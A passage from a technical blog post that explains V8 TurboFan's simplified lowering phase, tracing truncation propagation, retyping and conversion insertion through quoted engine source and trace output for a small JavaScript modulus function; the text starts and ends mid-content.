<li>may insert conversion nodes</li>
</ul>
</li>
</ol>
<p>To get a better understanding, we study the evolution of the sea of nodes graph for the below function :</p>
<div class="highlight"><pre><span></span><code><span class="kd">function</span> <span class="nx">f</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mh">0x42</span> <span class="o">%</span> <span class="nx">x</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">%</span><span class="nx">PrepareFunctionForOptimization</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
<span class="nx">f</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
<span class="nx">f</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
<span class="o">%</span><span class="nx">OptimizeFunctionOnNextCall</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
<span class="nx">f</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
</code></pre></div>

<!-- TODO : add something to see the whole picture first? like the full sea of nodes rather than starting with only the End node. Like a small TLDR + sea of node -->

<!-- TODO : quickly define truncation, use info and the whole prupose of the phase ? -->

<!-- TODO : kRepTaggedSigned representation vs kTaggedSigned -->

<!-- TODO : resize pictures -->

<h4 id="propagating-truncations">Propagating truncations</h4>
<p>To understand how truncations get propagated, we want to trace the simplified lowering using <code>--trace-representation</code> and look at the sea of nodes in Turbolizer right before the simplified lowering phase, which is by selecting the escape analysis phase in the menu.</p>
<p>The first phase starts from the <code>End</code> node. It visits the node and then enqueues its inputs. It doesn't truncate any of its inputs. The output is <code>tagged</code>.</p>
<!-- 
// markdown syntax but does not allow image resizing on a default setup
<center>![truncation1](\images\truncations\1.png)</center>
 -->

<p><center><img src="\images\truncations\1.png" width="20%"></img></center></p>
<div class="highlight"><pre><span></span><code> visit #31: End (trunc: no-value-use)
  initial #30: no-value-use
</code></pre></div>

<div class="highlight"><pre><span></span><code>  <span class="kt">void</span> <span class="nf">VisitNode</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">Truncation</span> <span class="n">truncation</span><span class="p">,</span>
                 <span class="n">SimplifiedLowering</span><span class="o">*</span> <span class="n">lowering</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kEnd</span><span class="p">:</span>
       <span class="c1">// ...</span>
      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kJSParseInt</span><span class="p">:</span>
        <span class="n">VisitInputs</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
        <span class="c1">// Assume the output is tagged.</span>
        <span class="k">return</span> <span class="n">SetOutput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTagged</span><span class="p">);</span>
</code></pre></div>

<p>Then, for every node in the queue, the corresponding visitor is called. In that case, only a <code>Return</code> node is in the queue.</p>
<!--
<center>![truncation2](\images\truncations\2.png)</center>
-->
<p><center><img src="\images\truncations\2.png" width="20%"></img></center></p>
<p>The visitor indicates use informations. The first input is truncated to a word32. The other inputs are not truncated.
The output is <code>tagged</code>.</p>
<div class="highlight"><pre><span></span><code>  <span class="kt">void</span> <span class="nf">VisitNode</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">Truncation</span> <span class="n">truncation</span><span class="p">,</span>
                 <span class="n">SimplifiedLowering</span><span class="o">*</span> <span class="n">lowering</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">opcode</span><span class="p">())</span> <span class="p">{</span>
      <span class="c1">// ...</span>
      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kReturn</span><span class="p">:</span>
        <span class="n">VisitReturn</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
        <span class="c1">// Assume the output is tagged.</span>
        <span class="k">return</span> <span class="n">SetOutput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTagged</span><span class="p">);</span>
      <span class="c1">// ...</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="kt">void</span> <span class="nf">VisitReturn</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">tagged_limit</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ValueInputCount</span><span class="p">()</span> <span class="o">+</span>
                       <span class="n">OperatorProperties</span><span class="o">::</span><span class="n">GetContextInputCount</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">())</span> <span class="o">+</span>
                       <span class="n">OperatorProperties</span><span class="o">::</span><span class="n">GetFrameStateInputCount</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">());</span>
    <span class="c1">// Visit integer slot count to pop</span>
    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">TruncatingWord32</span><span class="p">());</span>

    <span class="c1">// Visit value, context and frame state inputs as tagged.</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">tagged_limit</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">AnyTagged</span><span class="p">());</span>
    <span class="p">}</span>
    <span class="c1">// Only enqueue other inputs (effects, control).</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">tagged_limit</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">InputCount</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">EnqueueInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div>

<p>In the trace, we indeed observe that the <code>End</code> node didn't propagate any truncation to the <code>Return</code> node. However, the <code>Return</code> node does truncate its first input. </p>
<div class="highlight"><pre><span></span><code> visit #30: Return (trunc: no-value-use)
  initial #29: truncate-to-word32
  initial #28: no-truncation (but distinguish zeros)
   queue #28?: no-truncation (but distinguish zeros)
  initial #21: no-value-use
</code></pre></div>

<p>All the inputs (29, 28 21) are set in the queue and now have to be visited.</p>
<!--<center>![truncation3](\images\truncations\3.png)</center>-->
<p><center><img src="\images\truncations\3.png" width="45%"></img></center></p>
<p>We can see that the truncation to word32 has been propagated to the node 29.</p>
<div class="highlight"><pre><span></span><code> visit #29: NumberConstant (trunc: truncate-to-word32)
</code></pre></div>

<p>When visiting the node 28, the visitor for <code>SpeculativeNumberModulus</code>, in that case, decides that the first two inputs should get truncated to word32.</p>
<div class="highlight"><pre><span></span><code> visit #28: SpeculativeNumberModulus (trunc: no-truncation (but distinguish zeros))
  initial #24: truncate-to-word32
  initial #23: truncate-to-word32
  initial #13: no-value-use
   queue #21?: no-value-use
</code></pre></div>

<p>Indeed, if we look at the code of the visitor, if both inputs are typed as <code>Type::Unsigned32OrMinusZeroOrNaN()</code>, which is the case since they are typed as <code>Range(66,66)</code> and <code>Range(2,5)</code> , and the node truncation is a word32 truncation (not the case here since there is no truncation) or the node is typed as <code>Type::Unsigned32()</code> (true because the node is typed as <code>Range(0,4)</code>) then, a call to <code>VisitWord32TruncatingBinop</code> is made.</p>
<p>This visitor indicates a truncation to word32 on the first two inputs and sets the output representation to <code>Any</code>. It also add all the inputs to the queue.</p>
<div class="highlight"><pre><span></span><code>  <span class="kt">void</span> <span class="nf">VisitSpeculativeNumberModulus</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">Truncation</span> <span class="n">truncation</span><span class="p">,</span>
                                     <span class="n">SimplifiedLowering</span><span class="o">*</span> <span class="n">lowering</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">BothInputsAre</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">Type</span><span class="o">::</span><span class="n">Unsigned32OrMinusZeroOrNaN</span><span class="p">())</span> <span class="o">&amp;&amp;</span>
        <span class="p">(</span><span class="n">truncation</span><span class="p">.</span><span class="n">IsUsedAsWord32</span><span class="p">()</span> <span class="o">||</span>
         <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="p">).</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Unsigned32</span><span class="p">())))</span> <span class="p">{</span>
      <span class="c1">// =&gt; unsigned Uint32Mod</span>
      <span class="n">VisitWord32TruncatingBinop</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">())</span> <span class="n">DeferReplacement</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">lowering</span><span class="o">-&gt;</span><span class="n">Uint32Mod</span><span class="p">(</span><span class="n">node</span><span class="p">));</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// ...</span>
  <span class="p">}</span>

  <span class="kt">void</span> <span class="nf">VisitWord32TruncatingBinop</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">VisitBinop</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">TruncatingWord32</span><span class="p">(),</span>
               <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kWord32</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Helper for binops of the I x I -&gt; O variety.</span>
  <span class="kt">void</span> <span class="nf">VisitBinop</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">UseInfo</span> <span class="n">input_use</span><span class="p">,</span> <span class="n">MachineRepresentation</span> <span class="n">output</span><span class="p">,</span>
                  <span class="n">Type</span> <span class="n">restriction_type</span> <span class="o">=</span> <span class="n">Type</span><span class="o">::</span><span class="n">Any</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">VisitBinop</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">input_use</span><span class="p">,</span> <span class="n">input_use</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">restriction_type</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="c1">// Helper for binops of the R x L -&gt; O variety.</span>
  <span class="kt">void</span> <span class="nf">VisitBinop</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">UseInfo</span> <span class="n">left_use</span><span class="p">,</span> <span class="n">UseInfo</span> <span class="n">right_use</span><span class="p">,</span>
                  <span class="n">MachineRepresentation</span> <span class="n">output</span><span class="p">,</span>
                  <span class="n">Type</span> <span class="n">restriction_type</span> <span class="o">=</span> <span class="n">Type</span><span class="o">::</span><span class="n">Any</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ValueInputCount</span><span class="p">());</span>
    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">left_use</span><span class="p">);</span>
    <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">right_use</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">InputCount</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">EnqueueInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">SetOutput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">restriction_type</span><span class="p">);</span>
  <span class="p">}</span>
</code></pre></div>

<p>For the next node in the queue (#21), the visitor doesn't indicate any truncation.</p>
<div class="highlight"><pre><span></span><code> visit #21: Merge (trunc: no-value-use)
  initial #19: no-value-use
  initial #17: no-value-use
</code></pre></div>

<p>It simply adds its own inputs to the queue and indicates that this <code>Merge</code> node has a <code>kTagged</code> output representation.</p>
<div class="highlight"><pre><span></span><code>  <span class="kt">void</span> <span class="nf">VisitNode</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">Truncation</span> <span class="n">truncation</span><span class="p">,</span>
                 <span class="n">SimplifiedLowering</span><span class="o">*</span> <span class="n">lowering</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kMerge</span><span class="p">:</span>
      <span class="c1">// ...</span>
      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kJSParseInt</span><span class="p">:</span>
        <span class="n">VisitInputs</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
        <span class="c1">// Assume the output is tagged.</span>
        <span class="k">return</span> <span class="n">SetOutput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTagged</span><span class="p">);</span>
</code></pre></div>

<p>The <code>SpeculativeNumberModulus</code> node indeed propagated a truncation to word32 to its inputs 24 (NumberConstant) and 23 (Phi).</p>
<div class="highlight"><pre><span></span><code> visit #24: NumberConstant (trunc: truncate-to-word32)
 visit #23: Phi (trunc: truncate-to-word32)
  initial #20: truncate-to-word32
  initial #22: truncate-to-word32
   queue #21?: no-value-use
 visit #13: JSStackCheck (trunc: no-value-use)
  initial #12: no-truncation (but distinguish zeros)
  initial #14: no-truncation (but distinguish zeros)
  initial #6: no-value-use
  initial #0: no-value-use
</code></pre></div>

<!--<center>![truncation4](\images\truncations\4.png)</center>-->
<p><center><img src="\images\truncations\4.png" width="70%"></img></center></p>
<p>Now let's have a look at the phi visitor. It simply forwards the propagations to its inputs and adds them to the queue. The output representation is inferred from the phi node's type.</p>
<div class="highlight"><pre><span></span><code>  <span class="c1">// Helper for handling phis.</span>
  <span class="kt">void</span> <span class="nf">VisitPhi</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">Truncation</span> <span class="n">truncation</span><span class="p">,</span>
                <span class="n">SimplifiedLowering</span><span class="o">*</span> <span class="n">lowering</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">MachineRepresentation</span> <span class="n">output</span> <span class="o">=</span>
        <span class="n">GetOutputInfoForPhi</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">TypeOf</span><span class="p">(</span><span class="n">node</span><span class="p">),</span> <span class="n">truncation</span><span class="p">);</span>
    <span class="c1">// Only set the output representation if not running with type</span>
    <span class="c1">// feedback. (Feedback typing will set the representation.)</span>
    <span class="n">SetOutput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">output</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">values</span> <span class="o">=</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ValueInputCount</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">())</span> <span class="p">{</span>
      <span class="c1">// Update the phi operator.</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">output</span> <span class="o">!=</span> <span class="n">PhiRepresentationOf</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">()))</span> <span class="p">{</span>
        <span class="n">NodeProperties</span><span class="o">::</span><span class="n">ChangeOp</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">lowering</span><span class="o">-&gt;</span><span class="n">common</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Phi</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">values</span><span class="p">));</span>
      <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// Convert inputs to the output representation of this phi, pass the</span>
    <span class="c1">// truncation along.</span>
    <span class="n">UseInfo</span> <span class="n">input_use</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">truncation</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">node</span><span class="o">-&gt;</span><span class="n">InputCount</span><span class="p">();</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">ProcessInput</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">values</span> <span class="o">?</span> <span class="nl">input_use</span> <span class="p">:</span> <span class="n">UseInfo</span><span class="o">::</span><span class="n">None</span><span class="p">());</span>
    <span class="p">}</span>
  <span class="p">}</span>
</code></pre></div>

<!--<center>![truncation5](\images\truncations\5.png)</center>-->
<p><center><img src="\images\truncations\5.png" width="70%"></img></center></p>
<p>Finally, the phi node's inputs get visited.</p>
<div class="highlight"><pre><span></span><code> visit #20: NumberConstant (trunc: truncate-to-word32)
 visit #22: NumberConstant (trunc: truncate-to-word32)
</code></pre></div>

<p>They don't have any inputs to enqueue. Output representation is set to <code>tagged signed</code>.</p>
<div class="highlight"><pre><span></span><code>      <span class="k">case</span> <span class="n">IrOpcode</span><span class="o">::</span><span class="nl">kNumberConstant</span><span class="p">:</span> <span class="p">{</span>
        <span class="kt">double</span> <span class="k">const</span> <span class="n">value</span> <span class="o">=</span> <span class="n">OpParameter</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;</span><span class="p">(</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">op</span><span class="p">());</span>
        <span class="kt">int</span> <span class="n">value_as_int</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">DoubleToSmiInteger</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value_as_int</span><span class="p">))</span> <span class="p">{</span>
          <span class="n">VisitLeaf</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTaggedSigned</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">())</span> <span class="p">{</span>
            <span class="kt">intptr_t</span> <span class="n">smi</span> <span class="o">=</span> <span class="n">bit_cast</span><span class="o">&lt;</span><span class="kt">intptr_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Smi</span><span class="o">::</span><span class="n">FromInt</span><span class="p">(</span><span class="n">value_as_int</span><span class="p">));</span>
            <span class="n">DeferReplacement</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">lowering</span><span class="o">-&gt;</span><span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IntPtrConstant</span><span class="p">(</span><span class="n">smi</span><span class="p">));</span>
          <span class="p">}</span>
          <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">VisitLeaf</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">MachineRepresentation</span><span class="o">::</span><span class="n">kTagged</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
      <span class="p">}</span>
</code></pre></div>

<p>We've unrolled enough of the algorithm by hand to understand the first truncation propagation phase. Let's have a look at the type propagation phase.</p>
<p>Please note that a visitor may behave differently according to the phase that is currently being executing.</p>
<div class="highlight"><pre><span></span><code>  <span class="kt">bool</span> <span class="nf">lower</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span> <span class="k">return</span> <span class="n">phase_</span> <span class="o">==</span> <span class="n">LOWER</span><span class="p">;</span> <span class="p">}</span>
  <span class="kt">bool</span> <span class="nf">retype</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span> <span class="k">return</span> <span class="n">phase_</span> <span class="o">==</span> <span class="n">RETYPE</span><span class="p">;</span> <span class="p">}</span>
  <span class="kt">bool</span> <span class="nf">propagate</span><span class="p">()</span> <span class="k">const</span> <span class="p">{</span> <span class="k">return</span> <span class="n">phase_</span> <span class="o">==</span> <span class="n">PROPAGATE</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div>

<p>That's why the NumberConstant visitor does not trigger a <code>DeferReplacement</code> during the truncation propagation phase.</p>
<h4 id="retyping">Retyping</h4>
<p>There isn't so much to say about the retyping phase. Starting from the End node, every node of the graph is put in a stack. Then, starting from the top of the stack, types are updated with <code>UpdateFeedbackType</code> and revisited. This allows to forward propagate updated type information (starting from the Start, not the End).</p>
<p>As we can observe by tracing the phase, that's when final output representations are computed and displayed : </p>
<div class="highlight"><pre><span></span><code> visit #29: NumberConstant
  ==&gt; output kRepTaggedSigned
</code></pre></div>

<p>For nodes 23 (phi) and 28 (SpeculativeNumberModulus), there is also an updated feedback type.</p>
<div class="highlight"><pre><span></span><code>#23:Phi[kRepTagged](#20:NumberConstant, #22:NumberConstant, #21:Merge)  [Static type: Range(2, 5)]
 visit #23: Phi
  ==&gt; output kRepWord32
</code></pre></div>

<div class="highlight"><pre><span></span><code>#28:SpeculativeNumberModulus[SignedSmall](#24:NumberConstant, #23:Phi, #13:JSStackCheck, #21:Merge)  [Static type: Range(0, 4)]
 visit #28: SpeculativeNumberModulus
  ==&gt; output kRepWord32
</code></pre></div>

<h4 id="lowering-and-inserting-conversions">Lowering and inserting conversions</h4>
<p>Now that every node has been associated with use informations for every input as well as an output representation, the last phase consists in :</p>
<ul>
<li>lowering the node itself to a more specific one (via a <code>DeferReplacement</code> for instance)</li>
<li>converting nodes when the output representation of an input doesn't match with the expected use information for this input (could be done with <code>ConvertInput</code>)</li>
</ul>
<p>Note that a node won't necessarily change. There may not be any lowering and/or any conversion.</p>
<p>Let's get through the evolution of a few nodes. The NumberConstant #29 will be replaced by the Int32Constant #41. Indeed, the output of the NumberConstant @29 has a kRepTaggedSigned representation. However, because it is used as its first input, the Return node wants it to be truncated to word32. Therefore, the node will get converted. This is done by the <code>ConvertInput</code> function. It will itself call the representation changer via the function <code>GetRepresentationFor</code>. Because the truncation to word32 is requested, execution is redirected to <code>RepresentationChanger::GetWord32RepresentationFor</code> which then calls <code>MakeTruncatedInt32Constant</code>.</p>
<div class="highlight"><pre><span></span><code><span class="n">Node</span><span class="o">*</span> <span class="n">RepresentationChanger</span><span class="o">::</span><span class="n">MakeTruncatedInt32Constant</span><span class="p">(</span><span class="kt">double</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">return</span> <span class="n">jsgraph</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">Int32Constant</span><span class="p">(</span><span class="n">DoubleToInt32</span><span class="p">(</span><span class="n">value</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div>

<!--<center>![side by side - input 1](\images\lowering_conversions\side_by_side_input1.png)</center>-->
<p><center><img src="\images\lowering_conversions\side_by_side_input1.png" width="70%"></img></center></p>
<div class="highlight"><pre><span></span><code>visit #30: Return
  change: #30:Return(@0 #29:NumberConstant)  from kRepTaggedSigned to kRepWord32:truncate-to-word32
</code></pre></div>

<p>For the second input of the Return node, the use information indicates a tagged representation and no truncation. However, the second input (SpeculativeNumberModulus #28) has a kRepWord32 output representation. Again, it doesn't match and when calling <code>ConvertInput</code> the representation changer will be used. This time, the function used is <code>RepresentationChanger::GetTaggedRepresentationFor</code>. If the type of the input (node #28) is a <code>Signed31</code>, then TurboFan knows it can use a <code>ChangeInt31ToTaggedSigned</code> operator to make the conversion. This is the case here because the type computed for node 28 is <code>Range(0,4)</code>.</p>
<div class="highlight"><pre><span></span><code><span class="c1">// ...</span>
    <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">IsWord</span><span class="p">(</span><span class="n">output_rep</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">output_type</span><span class="p">.</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Signed31</span><span class="p">()))</span> <span class="p">{</span>
      <span class="n">op</span> <span class="o">=</span> <span class="n">simplified</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ChangeInt31ToTaggedSigned</span><span class="p">();</span>
    <span class="p">}</span>
</code></pre></div>

<!--<center>![side by side - input 2](\images\lowering_conversions\side_by_side_input2.png)</center>-->
<p><center><img src="\images\lowering_conversions\side_by_side_input2.png" width="90%"></img></center></p>
<div class="highlight"><pre><span></span><code>visit #30: Return
  change: #30:Return(@1 #28:SpeculativeNumberModulus)  from kRepWord32 to kRepTagged:no-truncation (but distinguish zeros)
</code></pre></div>

<p>The last example we'll go through is the case of the SpeculativeNumberModulus node itself. </p>
<div class="highlight"><pre><span></span><code> visit #28: SpeculativeNumberModulus
  change: #28:SpeculativeNumberModulus(@0 #24:NumberConstant)  from kRepTaggedSigned to kRepWord32:truncate-to-word32
// (comment) from #24:NumberConstant to #44:Int32Constant
defer replacement #28:SpeculativeNumberModulus with #60:Phi
</code></pre></div>

<p>If we compare the graph (well, a subset), we can observe :</p>
<ul>
<li>the insertion of the ChangeInt31ToTaggedSigned (#42), in the blue rectangle</li>
<li>the original inputs of node #28, before simplified lowering, are still there but attached to other nodes (orange rectangle)</li>
<li>node #28 has been replaced by the phi node #60 ... but it also leads to the creation of all the other nodes in the orange rectangle</li>
</ul>
<p>This is before simplified lowering : </p>
<!--<center>![speculative modulus before](\images\lowering_conversions\speculative_mod_1_before.png)</center>-->
<p><center><img src="\images\lowering_conversions\speculative_mod_1_before.png" width="80%"></img></center></p>
<p>This is after :</p>
<!--<center>![speculative modulus after](\images\lowering_conversions\speculative_mod_2_after.png)</center>-->
<p><center><img src="\images\lowering_conversions\speculative_mod_2_after.png"></img></center></p>
<p>The creation of all the nodes inside the green rectangle is done by <code>SimplifiedLowering::Uint32Mod</code> which is called by the SpeculativeNumberModulus visitor.</p>
<div class="highlight"><pre><span></span><code>  <span class="kt">void</span> <span class="nf">VisitSpeculativeNumberModulus</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="n">node</span><span class="p">,</span> <span class="n">Truncation</span> <span class="n">truncation</span><span class="p">,</span>
                                     <span class="n">SimplifiedLowering</span><span class="o">*</span> <span class="n">lowering</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">BothInputsAre</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">Type</span><span class="o">::</span><span class="n">Unsigned32OrMinusZeroOrNaN</span><span class="p">())</span> <span class="o">&amp;&amp;</span>
        <span class="p">(</span><span class="n">truncation</span><span class="p">.</span><span class="n">IsUsedAsWord32</span><span class="p">()</span> <span class="o">||</span>
         <span class="n">NodeProperties</span><span class="o">::</span><span class="n">GetType</span><span class="p">(</span><span class="n">node</span><span class="p">).</span><span class="n">Is</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">Unsigned32</span><span class="p">())))</span> <span class="p">{</span>
      <span class="c1">// =&gt; unsigned Uint32Mod</span>
      <span class="n">VisitWord32TruncatingBinop</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">lower</span><span class="p">())</span> <span class="n">DeferReplacement</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">lowering</span><span class="o">-&gt;</span><span class="n">Uint32Mod</span><span class="p">(</span><span class="n">node</span><span class="p">));</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="n">Node</span><span class="o">*</span> <span class="n">SimplifiedLowering</span><span class="o">::</span><span class="n">Uint32Mod</span><span class="p">(</span><span class="n">Node</span><span class="o">*</span> <span class="k">const</span> <span class="n">node</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Uint32BinopMatcher</span> <span class="n">m</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
